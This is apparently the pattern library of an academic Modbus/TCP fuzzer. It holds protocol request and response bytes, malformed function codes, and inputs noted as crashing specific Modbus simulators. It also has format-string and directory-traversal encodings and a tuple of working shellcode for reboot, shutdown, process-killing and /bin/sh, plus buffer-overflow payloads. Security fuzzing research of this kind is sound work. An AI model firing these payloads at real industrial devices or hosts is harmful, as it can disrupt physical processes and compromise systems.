#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
This is distributed under GNU LGPL license, 
Source code for Modbus//TCP fuzzer used for the ETFA 2015//2018
Code compiled by K. Katsigiannis.
For related questions please contact kkatsigiannis@upatras.gr
This is distributed under GNU LGPL license, see license.txt

"""

# Library for fuzzing message >>> Filename: fuzz_patterns.py

request = (
                (0x01, '\x01\x00\x01\x00\x01'),                       # read coils
                (0x02, '\x02\x00\x01\x00\x01'),                       # read discrete inputs
                (0x03, '\x03\x00\x01\x00\x01'),                       # read holding registers
                (0x04, '\x04\x00\x01\x00\x01'),                       # read input registers
                (0x05, '\x05\x00\x01\x00\x01'),                       # write single coil
                (0x06, '\x06\x00\x01\x00\x01'),                       # write single register
                (0x07, '\x07'),                                       # read exception status
                (0x08, '\x08\x00\x00\x00\x00'),                       # read diagnostic
                (0x0b, '\x0b'),                                       # get comm event counters
                (0x0c, '\x0c'),                                       # get comm event log
                (0x0f, '\x0f\x00\x01\x00\x08\x01\x00\xff'),           # write multiple coils
                (0x10, '\x10\x00\x01\x00\x02\x04\x01\x02'),           # write multiple registers
                (0x11, '\x11'),                                       # report slave id
                (0x14, '\x14\x0e\x06\x00\x04\x00\x01\x00\x02' 
                       '\x06\x00\x03\x00\x09\x00\x02'),               # read file record
                (0x15, '\x15\x0d\x06\x00\x04\x00\x07\x00\x03' 
                       '\x06\xaf\x04\xbe\x10\x0d'),                   # write file record
                (0x16, '\x16\x00\x01\x00\xff\xff\x00'),               # mask write register
                (0x17, '\x17\x00\x01\x00\x01\x00\x01\x00\x01\x02\x12\x34'),# read/write multiple registers
                (0x18, '\x18\x00\x01'),                               # read fifo queue
                (0x2b, '\x2b\x0e\x01\x00'),                           # read device identification    crash tmw v3.26                   
        )                  
        
response = (
                (0x01, '\x01\x01\x01'),                               # read coils
                (0x02, '\x02\x01\x01'),                               # read discrete inputs
                (0x03, '\x03\x02\x01\x01'),                           # read holding registers
                (0x04, '\x04\x02\x01\x01'),                           # read input registers
                (0x05, '\x05\x00\x01\x00\x01'),                       # write single coil
                (0x06, '\x06\x00\x01\x00\x01'),                       # write single register
                (0x07, '\x07\x00'),                                   # read exception status
                (0x08, '\x08\x00\x00\x00\x00'),                       # read diagnostic
                (0x0b, '\x0b\x00\x00\x00\x00'),                       # get comm event counters
                (0x0c, '\x0c\x08\x00\x00\x01\x08\x01\x21\x20\x00'),   # get comm event log
                (0x0f, '\x0f\x00\x01\x00\x08'),                       # write multiple coils
                (0x10, '\x10\x00\x01\x00\x02'),                       # write multiple registers
                (0x11, '\x11\x03\x05\x01\x54'),                       # report slave id (device specific)
                (0x14, '\x14\x0c\x05\x06\x0d\xfe\x00\x20\x05' 
                       '\x06\x33\xcd\x00\x40'),                       # read file record
                (0x15,'\x15\x0d\x06\x00\x04\x00\x07\x00\x03' 
                       '\x06\xaf\x04\xbe\x10\x0d'),                   # write file record
                (0x16, '\x16\x00\x01\x00\xff\xff\x00'),               # mask write register
                (0x17, '\x17\x02\x12\x34'),                           # read/write multiple registers
                (0x18, '\x18\x00\x01\x00\x01\x00\x00'),               # read fifo queue
                (0x2b, '\x2b\x0e\x01\x01\x00\x00\x01\x00\x01\x77'),   # read device identification
        )
bad = (                                                        #ITEM 12  
        (0x80, '\x80\x00\x00\x00'),                            # Unknown Function
        (0x81, '\x81\x00\x00\x00'),                            # error message
        (0x90, '\x90\x00\x00\x00'),
        (0x91, '\x91\x00\x00\x00'),
        (0x92, '\x92\x00\x00\x00'),
        (0x93, '\x93\x00\x00\x00'),
        (0x94, '\x94\x00\x00\x00'),
        (0x95, '\x95\x00\x00\x00'),
        (0x96, '\x96\x00\x00\x00'),
        (0x97, '\x97\x00\x00\x00'),
        (0x98, '\x98\x00\x00\x00'),
        (0x99, '\x99\x00\x00\x00'),                           
      )


exception = (
        (0x81, '\x81\x01\xd0\x50'),                           # illegal function exception
        (0x82, '\x82\x02\x90\xa1'),                           # illegal data address exception
        (0x83, '\x83\x03\x50\xf1'),                           # illegal data value exception
        (0x84, '\x84\x04\x13\x03'),                           # skave device failure exception  -crash
        (0x85, '\x85\x05\xd3\x53'),                           # acknowledge exception
        (0x86, '\x86\x06\x93\xa2'),                           # slave device busy exception
        (0x87, '\x87\x08\x53\xf2'),                           # memory parity exception
        (0x88, '\x88\x0a\x16\x06'),  
        (0x89, '\x89\x0b\xd6\x56'),                           # gateway target failed exception
        
       
      )

#tumple object 
diagnostics = (
        
        (00, '\x08\x00\x00\x00\x00'),
        (0o1, '\x08\x00\x01\x00\x00'),                               #restartCommunaications
        (0o2, '\x08\x00\x02\x00\x00'),                               #ReturnDiagnosticRegisterResponse
        (0o3, '\x08\x00\x03\x00\x00'),                               #ChangeAsciiInputDelimiterResponse
        (0o4, '\x08\x00\x04'),                                       #ForceListenOnlyModeResponse
        (0o5, '\x08\x00\x00\x00\x00'),                               #ReturnQueryDataResponse
        (0o6, '\x08\x00\x0a\x00\x00'),                               #ClearCountersResponse
        (0o7, '\x08\x00\x0b\x00\x00'),                               #ReturnBusMessageCountResponse
        (10, '\x08\x00\x0c\x00\x00'),                               #ReturnBusCommunicationErrorCountResponse
        (11, '\x08\x00\x0d\x00\x00'),                               #ReturnBusExceptionErrorCountResponse
        (12, '\x08\x00\x0e\x00\x00'),                               #ReturnSlaveMessageCountResponse
        (13, '\x08\x00\x0f\x00\x00'),                               #ReturnSlaveNoReponseCountResponse
        (14, '\x08\x00\x10\x00\x00'),                               #ReturnSlaveNAKCountResponse     
        (15, '\x08\x00\x11\x00\x00'),                               #ReturnSlaveBusyCountResponse
        (16, '\x08\x00\x12\x00\x00'),                               #ReturnSlaveBusCharacterOverrunCountResponse
        (17, '\x08\x00\x13\x00\x00'),                               #ReturnIopOverrunCountResponse   
        (18, '\x08\x00\x14\x00\x00'),                               #ClearOverrunCountResponse      
        (19, '\x08\x00\x15' + '\x00\x00' * 55),                    #SetClearModbusPlusResponse
        (20, '\x08\x00\x01\x00\xff')                                #restartCommunaications         
      )

little_endian_payload = (
                       (1, '\x01\x02\x00\x03\x00\x00\x00\x04\x00\x00\x00\x00'), 
                       (2, '\x00\x00\x00\xff\xfe\xff\xfd\xff\xff\xff\xfc\xff'),
                       (3, '\xff\xff\xff\xff\xff\xff\x00\x00\xa0\x3f\x00\x00'),
                       (4, '\x00\x00\x00\x00\x19\x40\x74\x65\x73\x74\x11'),
                       )

sequence = \
            (  
                (1, b'\x00\x00'),    #crash modrssim827
                (2, b'\xFF'),        #DoS modrssim827
                (8, b'\xFE'),   
                (9, b'\x2b'),      
                (10, b'\x00\x06'),   #crash modrssim827
                (11, b'\x00\x02'),   #crash modrssim827
                (12, b'\x00\x03'),   
                (13, b'\x00\x04'),   #crash modrssim827
                (14, b'\x00\x05'),   
                (15, b'\x00\xff'),   
                (16, b'\x00\xfe'),   
                (20, b'\x00\x0b'),  
                (21, b'\x00\x0c'),   #crash modrssim827
                (24, b'\xFE\xFF'),   #crash modrssim827
                (27, b'\xde\xad'),
                (28, b'\x00\x2b'),
                )

serial = \
            (  
                (00, '\x07'),                                       # read exception status
                (0o1, '\x0b'),                                       # get comm event counters
                (0o2, b'\x0c'),                                       # get comm event log
                (0o3, '\x11'),                                       #report slave id 
                (0o4, '\x18\x00\x01'),                               # read fifo queue
                (0o5, '\x2b\x0e\x01\x00'),                           # read device identification  
                (0o7, '\x07\x00'),                                   # response -read exception status/ response
                (10, '\x0b\x00\x00\x00\x00'),                       # response -get comm event counters
                (11, '\x0c\x08\x00\x00\x01\x08\x01\x21\x20\x00'),   # response -get comm event log
                (12, '\x18\x00\x01\x00\x01\x00\x00'),               # response -read fifo queue
                (13, '\x2b\x0e\x01\x01\x00\x00\x01\x00\x01\x77'),   # response- read device identification
                (14, '\x11\x03\x05\x01\x54'),                       # response -report slave id (device specific                                       
                )

omission = \
            (
                #(1, b""),
                (2, b"\t"),
                (3,b"!"),
                (4,b"@"),
                (5,b"#"),
                (6,b"$"),
                (7,b"%"),
                (8,b"^"),
                (9, b"&"),
                (10,b"*"),
                (11,b"("),
                (12,b")"),
                (13,b"-"),
                (14,b"_"),
                (15,b"+"),
                (16,b"="),
                (17,b":"),
                (18,b": "), 
                (19,b":7"), 
                (20,b";"),
                (21,b"'"),
                (22,b"\""),
                (23,b"/"),
                (24,b"\\"),
                (25,b"?"),
                (26,b"<"),
                (27,b">"),
                (28,b"."),
                (29,b","),
                (30,b"\r"),
                (31,b"\n"),
                (32,b"\r\n")
                )

strings_format = \
            (
                (1,"%n")     ,
                (2,"\"%n\"" ),
                (3,"%s"    ) ,               
                (4,"\"%s\"") ,
                (5,"%d"    ) ,                
                (6,"\"%d\"") ,
                (7,"%x"    ) ,                
                (8,"\"%x\"" ),
                (9,"%u"    ) ,
                (10,"\"%u\"" )
                )


crash_code = (
                (1, \
                b'\x01\xff\x00\x00' +b'\t\r\n' * 100 + b'\xfe' + b'\xfe'),
                
                (2, \
                b'\x01\xff\x00\x00' +(b'\t\r\n' * 100) +  b'\xfe' + b'\xfe'),

                (3, \
                b'\x01\xff\x00\x00' + b'\t\r\n' +  b'\xfe' + b'\xfe'),

                (4, \
                b'\x01\xff\x00\x00' +b'\t\r\n' *10 + b'\xfe' + b'\xfe'),

             )   

shellcode = (    
                (1, \
                b"\\xeb\\x05\\x6a\\x3c\\x58\\x0f\\x05\\x6a\\x02\\x5f\\x48\\x8d\\x54\\x24\\xec\\xc6" \
                b"\\x02\\x10\\x48\\x8d\\x72\\x04\\xff\\xc7\\x66\\x85\\xff\\x74\\xe5\\x48\\x8d\\x62" \
                b"\\x14\\x48\\x83\\xec\\x20\\x6a\\x34\\x58\\x0f\\x05\\x84\\xc0\\x75\\xe8\\x6a\\x1b" \
                b"\\x59\\xbb%s\\xf7\\xd3\\x39\\x1c\\x8c\\x75\\xd9\\xb1\\x35\\x66\\xbb%s\\x66\\xf7" \
                b"\\xd3\\x66\\x39\\x1c\\x4c\\x75\\xca\\x50\\x5e\\x6a\\x21\\x58\\x0f\\x05\\xff\\xc6" \
                b"\\x83\\xfe\\x04\\x75\\xf4\\x5f\\x57\\x57\\x5e\\x5a\\x48\\xbf\\x6a\\x2f\\x62\\x69" \
                b"\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x0f\\x05" ),
                
                (2, \
                b"\\x68\\xff\\x30\\x01\\x40\\x5b\\xc1\\xeb\\x08\\x48\\x8b\\x0b\\x48\\x03\\x4b\\x10" \
                b"\\x48\\x8b\\x59\\x16\\x48\\xff\\xcb\\x81\\x3b\\x7f\\x45\\x4c\\x46\\x75\\xf5\\xeb" \
                b"\\x03\\x59\\xeb\\x6a\\xe8\\xf8\\xff\\xff\\xff\\x55\\x55\\x52\\x48\\x31\\xd2\\x57" \
                b"\\x50\\x53\\x56\\x55\\x5f\\x53\\x5d\\x6a\\x4c\\x58\\x48\\x03\\x1c\\x83\\x48\\x83" \
                b"\\xc3\\x10\\x80\\x3b\\x05\\x75\\xf7\\x48\\x8b\\x43\\x08\\x48\\x8b\\x5b\\x18\\x48" \
                b"\\x83\\xc3\\x18\\x52\\x5e\\x66\\x33\\x33\\x48\\x01\\xc6\\x50\\x52\\x52\\x58\\xfc" \
                b"\\xac\\xc1\\xc2\\x0c\\x01\\xc2\\x84\\xc0\\x75\\xf6\\x52\\x5e\\x5a\\x58\\x39\\xf7" \
                b"\\x75\\xdd\\x48\\x03\\x6c\\x93\\x08\\x48\\x89\\x6c\\x24\\x30\\x5e\\x5b\\x58\\x5f" \
                b"\\x5a\\x5d\\xc3\\x68\\x80\\x47\\x6c\\x69\\x5d\\x48\\x31\\xff\\xff\\xd1\\xbd\\xf7" \
                b"\\x01\\xcc\\xf8\\x6a\\x02\\x5f\\x48\\x8d\\x54\\x24\\xec\\xc6\\x02\\x10\\x48\\x8d" \
                b"\\x72\\x04\\x66\\xff\\xc7\\x74\\xdc\\x48\\x8d\\x62\\x14\\x48\\x83\\xec\\x20\\x51" \
                b"\\xff\\xd1\\x59\\x84\\xc0\\x75\\xeb\\x6a\\x1b\\x41\\x58\\xb8%s\\xf7\\xd0\\x42" \
                b"\\x39\\x04\\x84\\x75\\xda\\x41\\xb0\\x35\\x66\\xb8%s\\xf7\\xd0\\x66\\x42\\x39" \
                b"\\x04\\x44\\x75\\xca\\x68\\x50\\x27\\x67\\x70\\x5d\\x48\\x31\\xd2\\x52\\x52\\x5e" \
                b"\\x51\\xff\\xd1\\x59\\xff\\xc6\\x83\\xfe\\x04\\x75\\xf5\\xbd\\x37\\xbb\\x6b\\xf6" \
                b"\\x48\\x31\\xff\\x57\\x57\\x5e\\x5a\\x48\\xbf\\x6a\\x2f\\x62\\x69\\x6e\\x2f\\x73" \
                b"\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\\x5f\\xff\\xd1"),
                
                ##### http://shell-storm.org/shellcode/ #######
                (3, b'\x31\xc0\x50 \xb0\x37xcd\x80'),                                            # FreeBSD_x86-reboot-7b.c (Shellcode, reboot(RB_AUTOBOOT), 7 bytes)                                       
                (4, b'\x31\xc0\x6a\x09\x48\x50\x40\xb0\x25\x50\xcd\x80'),                        #[FreeBSD x86 kill all procesess 12 bytes shellcode]
                (5, b'\x31\xc0\x66\xba\x0e\x27\x66\x81\xea\x06\x27\xb0\x37\xcd\x80'),            #FreeBSD reboot() shellcode

                (6, b"\x01\x30\x8f\xe2"                                                           #Linux/ARM - setuid(0) & kill(-1, SIGKILL) - 28 bytes
                    b"\x13\xff\x2f\xe1" \
                    b"\x24\x1b\x20\x1c" \
                    b"\x17\x27\x01\xdf" \
                    b"\x92\x1a\x10\x1c" \
                    b"\x01\x38\x09\x21" \
                    b"\x25\x27\x01\xdf"),
                
                (7, b"\x3c\x06\x43\x21"                                                           #Linux/MIPS - reboot() - 32 bytes.
                    b"\x34\xc6\xfe\xdc"       
                    b"\x3c\x05\x28\x12"      
                    b"\x34\xa5\x19\x69"     
                    b"\x3c\x04\xfe\xe1"       
                    b"\x34\x84\xde\xad"       
                    b"\x24\x02\x0f\xf8"       
                    b"\x01\x01\x01\x0c"),
                
                (8, b"\x48\x31\xc0\x48\x31\xd2\x50\x6a"                                            #shutdown -h now x86_64 Shellcode - 65 bytes
                    b"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
                    b"\x50\x66\x68\x2d\x68\x48\x89\xe1"
                    b"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
                    b"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
                    b"\x74\x64\x6f\x77\x6e\x41\x52\x41"
                    b"\x50\x48\x89\xe7\x52\x53\x51\x57"
                    b"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
                    b"\x05"),
                (9, b"\xba\xdc\xfe\x21\x43"                                                         #Linux/x86_64 reboot(POWER_OFF) 19 bytes shellcode
                    b"\xbe\x69\x19\x12\x28"  
                    b"\xbf\xad\xde\xe1\xfe" 
                    b"\xb0\xa9"              
                    b"\x0f\x05"),
                (10,b"\x31\xc0\x31\xd2\x50\x66\x68\x2d"
                    b"\x68\x89\xe7\x50\x6a\x6e\x66\xc7"
                    b"\x44\x24\x01\x6f\x77\x89\xe7\x50"
                    b"\x68\x64\x6f\x77\x6e\x68\x73\x68"
                    b"\x75\x74\x68\x6e\x2f\x2f\x2f\x68"
                    b"\x2f\x73\x62\x69\x89\xe3\x52\x56"
                    b"\x57\x53\x89\xe1\xb0\x0b\xcd\x80"),
                #Linux/x86 Force Reboot shellcode 36 bytes #
                (11,b"\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e"
                    b"\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3"
                    b"\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53"
                    b"\x89\xe1\xb0\x0b\xcd\x80"),
                #Linux x86 - Shutdown -h now - 51 bytes
                (12,b"\x6a\x0b\x58\x99\x52\x6a\x77\x66"
                    b"\x68\x6e\x6f\x89\xe6\x52\x66\x68"
                    b"\x2d\x68\x89\xe1\x52\x68\x64\x6f"
                    b"\x77\x6e\x68\x73\x68\x75\x74\x68"
                    b"\x69\x6e\x2f\x2f\x68\x2f\x2f\x73"
                    b"\x62\x89\xe3\x52\x56\x51\x53\x89"
                    b"\xe1\xcd\x80"),
                # 11 byte shellcode to kill all processes for Linux/x86
                (13,b"\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80"),
                #Solaris/x86 - SystemV killall command - 39 bytes
                (14,b"\x31\xc0\x50\x6a\x6c\x68\x6c\x6c\x61\x6c"
                    b"\x68\x6e\x2f\x6b\x69\x68\x2f\x73\x62\x69"
                    b"\x68\x2f\x75\x73\x72\x89\xe3\x50\x53\x89"
                    b"\xe2\x50\x52\x53\xb0\x3b\x50\xcd\x91"),
                #Stack based buffer overflow Exploitation
                (15,b"A"*219+b"\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x80\
                     xd0\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\
                     x41\x42\x42\x42\x42"+b"\x50\xfd\xff\xbf"),
                
                (16,b"A"*268 + b"\xf8\xf5\xff\xbf" +b"\x90"*30 +b"\xeb\x19\x31\xc0\x31\xdb\x30\
                    x10\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x18\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\
                    xff\xff\xff\x6e\x6f\x77\x20\x49\x20\x70\x30\x77\x6e\x20\x79\x6f\x75\x72\x20\x63\x6f\x6d\x70\
                    x75\x74\x65\x72"),
                
            )        

miscellaneous = \
            [    
                "<>" ,         
                "<",
                ">",
                "'",           
                "=",
                "a=",
                "&",
                ".",
                ",",
                "(",
                ")",
                "]",
                "[",
                "%",
                "*",
                "-",
                "+",
                "{",
                "}",

            ]

Dots = \
			[  
			"..",
             ".%00.",
             "..%01",
             ".?", "??", "?.",
             "%5C..",
             ".%2e", "%2e.",
             ".../.",
             "..../",
             "%2e%2e", "%%c0%6e%c0%6e",
             "0x2e0x2e", "%c0.%c0.",
             "%252e%252e",
             "%c0%2e%c0%2e", "%c0%ae%c0%ae",
             "%c0%5e%c0%5e", "%c0%ee%c0%ee",
             "%c0%fe%c0%fe", "%uff0e%uff0e",
             "%%32%%65%%32%%65",
             "%e0%80%ae%e0%80%ae",
             "%25c0%25ae%25c0%25ae",
             "%f0%80%80%ae%f0%80%80%ae",
             "%f8%80%80%80%ae%f8%80%80%80%ae", 
             "%fc%80%80%80%80%ae%fc%80%80%80%80%ae",

            ] 
Slashes  = \
			[
			"/", "\\",
            "%2f", "%5c",
            "0x2f", "0x5c",
            "%252f", "%255c",
            "%c0%2f", "%c0%af", "%c0%5c", "%c1%9c", "%c1%pc",
            "%c0%9v", "%c0%qf", "%c1%8s", "%c1%1c", "%c1%af",
            "%bg%qf", "%u2215", "%u2216", "%uEFC8", "%uF025",
            "%%32%%66", "%%35%%63",
            "%e0%80%af",
            "%25c1%259c", "%25c0%25af",
            "%f0%80%80%af",
            "%f8%80%80%80%af",
			]

Special_Prefixes = ["///", "\\\\\\","A", ".", "./", ".\\","../", "..\\"]


Special_Sufixes = ["%00", "%00index.html", "%00index.htm", ";index.html", ";index.htm"]

Special_Patterns = ["..//", "..///", "..\\\\", "..\\\\\\", "../\\", "..\\/",
                         "../\\/", "..\\/\\", "\\../", "/..\\", ".../", "...\\",
                    "./../", ".\\..\\", ".//..//", ".\\\\..\\\\","......///",
                    "%2e%c0%ae%5c", "%2e%c0%ae%2f"
                    ]

version = '0.1'

# End of fuzz_patterns.py